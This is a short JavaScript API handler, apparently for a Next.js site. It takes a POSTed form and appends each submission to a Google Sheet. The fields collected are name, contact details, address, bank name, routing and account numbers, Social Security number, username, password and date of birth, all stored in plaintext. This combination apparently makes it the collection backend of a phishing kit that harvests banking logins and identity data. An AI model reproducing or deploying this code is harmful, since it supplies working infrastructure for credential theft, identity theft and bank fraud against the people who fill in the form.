import { google } from "googleapis";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false });
  }

  try {
    const auth = new google.auth.GoogleAuth({
      credentials: {
        client_email: process.env.GOOGLE_CLIENT_EMAIL,
        private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, "\n"),
      },
      scopes: ["https://www.googleapis.com/auth/spreadsheets"],
    });

    const sheets = google.sheets({ version: "v4", auth });

    await sheets.spreadsheets.values.append({
      spreadsheetId: process.env.GOOGLE_SHEET_ID,
      range: "Sheet1!A:L",
      valueInputOption: "USER_ENTERED",
      requestBody: {
        values: [[
          req.body.name,
          req.body.phone,
          req.body.email,
          req.body.address,
          req.body.bank,
          req.body.routing,
          req.body.account,
          req.body.ssn,
          req.body.user,
          req.body.password,
          req.body.dob,
          new Date().toISOString()
        ]]
      }
    });

    return res.status(200).json({ success: true });

  } catch (error) {
    console.error("Google Error:", error);
    return res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
}
